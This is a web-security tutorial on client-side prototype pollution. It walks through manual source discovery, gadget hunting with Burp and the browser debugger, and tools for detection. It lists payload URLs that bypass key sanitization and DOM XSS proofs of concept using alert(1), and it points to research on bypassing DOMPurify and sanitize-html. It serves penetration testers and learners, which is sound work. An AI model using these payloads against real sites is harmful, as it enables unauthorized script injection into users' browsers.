# Client-Side Prototype Pollution

## Introduction

Client-side prototype pollution is a powerful vulnerability that allows attackers to manipulate JavaScript's global objects by injecting properties into prototypes. This guide will walk you through the process of identifying and exploiting these vulnerabilities, both manually and using automated tools like DOM Invader. You’ll also get hands-on practice exploiting prototype pollution for DOM-based Cross-Site Scripting (XSS) on intentionally vulnerable labs.

## What is Prototype Pollution?

Prototype pollution refers to the ability to inject properties into JavaScript’s global `Object.prototype`. This allows attackers to manipulate object behavior across the application, leading to severe security issues such as DOM-based XSS. Understanding the basic concepts of sources, sinks, and gadgets is crucial to mastering this vulnerability.

## Finding Client-Side Prototype Pollution Sources Manually

**High-Level Steps:**

1.  **Inject Arbitrary Properties**: Attempt to inject properties into the `Object.prototype` using the query string, URL fragment, or JSON input. For example:

    ```javascript
    vulnerable-website.com/?__proto__[foo]=bar
    ```
2.  **Inspect the Prototype**: Use the browser console to check if the property was successfully added:

    ```javascript
    Object.prototype.foo
    ```
3.  **Try Different Techniques**: If unsuccessful, alternate between dot notation and bracket notation:

    ```javascript
    vulnerable-website.com/?__proto__.foo=bar
    ```
4. **Explore Alternative Vectors**: If direct injection fails, attempt to exploit the prototype via its constructor.

## Identifying Gadgets for Exploitation

Once you’ve identified a source, the next step is to find gadgets—pieces of code that can be exploited using the polluted properties.

**Manual Gadget Hunting:**

1. Look through the source code and identify any properties that are used by the application or any libraries that it imports.
2. In Burp, enable response interception (**Proxy > Options > Intercept server responses**) and intercept the response containing the JavaScript that you want to test.
3. Add a `debugger` statement at the start of the script, then forward any remaining requests and responses.
4. In Burp's browser, go to the page on which the target script is loaded. The `debugger` statement pauses execution of the script.
5. While the script is still paused, switch to the console and enter the following command, replacing `YOUR-PROPERTY` with one of the properties that you think is a potential gadget:

```
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

The property is added to the global `Object.prototype`, and the browser will log a stack trace to the console whenever it is accessed.

6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application.
7. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
8. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval()`.
9. Repeat this process for any properties that you think are potential gadgets.

## Exploitation

### Bypasses

#### Prototype Pollution via the Constructor

Apart from the classic `__proto__` vector, attackers can also exploit the `constructor` property of JavaScript objects. By manipulating the constructor, you can gain access to the object’s prototype and pollute it without relying on the `__proto__` string.

#### Bypassing Flawed Key Sanitization

A common defense against prototype pollution is sanitizing property keys before merging them into objects. However, flawed sanitization processes that fail to recursively strip dangerous keys can be bypassed using creative input crafting.

```http
https://example.com/?__proto__[foo]=bar
https://example.com/?__proto__.foo=bar
https://example.com/?constructor.[prototype][foo]=bar
https://example.com/?constructor.prototype.foo=bar
# Bypass sanitization
https://example.com/?__pro__proto__to__[foo]=bar
https://example.com/?__pro__proto__to__.foo=bar
https://example.com/?constconstructorructor[prototype][foo]=bar
https://example.com/?constconstructorructor.prototype.foo=bar
https://example.com/?constconstructorructor[protoprototypetype][foo]=bar
https://example.com/?constconstructorructor.protoprototypetype.foo=bar
```

### Exploit to DOM XSS

If our payload affects an HTML element after loading, we can inject DOM-based XSS as below.\
Assume the key name of the property is "source\_url", whose value is loaded as "src" in a `script` element. What property name is defined might be found by investigating JavaScript code assigned in the website.

```http
https://example.com/?__proto__[source_url]=data:,alert(1);
https://example.com/?__proto__[source_url]=data:,alert(1);
https://example.com/?__proto__[source_url]=alert(1)-
```

### **Bypass HTML sanitizers**

{% embed url="https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/" %}

Research has shown that certain HTML sanitizers like `sanitize-html` and `DOMPurify` can be bypassed using prototype pollution gadgets. Understanding how to exploit these sanitizers can elevate your attack strategy.

* **sanitize-html**

<figure><img src="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-5-1024x137.png" alt="" height="137" width="1024"><figcaption></figcaption></figure>

* XSS

{% embed url="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png" %}

*   #### dompurify



<figure><img src="../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

## Tools for Detecting Prototype Pollution

* [**ppfuzz**](https://github.com/dwisiswant0/ppfuzz): A tool for fuzzing and finding prototype pollution vulnerabilities.
* [**ppmap**](https://github.com/kleiton0x00/ppmap): A map of known prototype pollution vulnerabilities in JavaScript libraries.
* [**proto-find**](https://github.com/kosmosec/proto-find): A tool for finding prototype pollution sources.
* [**PPScan**](https://github.com/msrkp/PPScan): A browser extension for automatically scanning web pages for prototype pollution vulnerabilities.
* [Dom-Invador](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution): Burp Browser Extension Automating Hunting for pp

## Resources

* [PortSwigger Web Security](https://portswigger.net/web-security/prototype-pollution/client-side)
* [Intigriti Revenge Challenge Writeup](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)
* [GitHub - Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
* [Khaled-Sakr Video](https://www.youtube.com/watch?v=xc7iilyFCWA)
* [pp-research](https://blog.s1r1us.ninja/research/PP)
* [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)
* [https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution#finding-script-gadgets](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution#finding-script-gadgets)
* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
* [https://github.com/HacKeD0x90/Prototype\_Pollution](https://github.com/HacKeD0x90/Prototype\_Pollution)
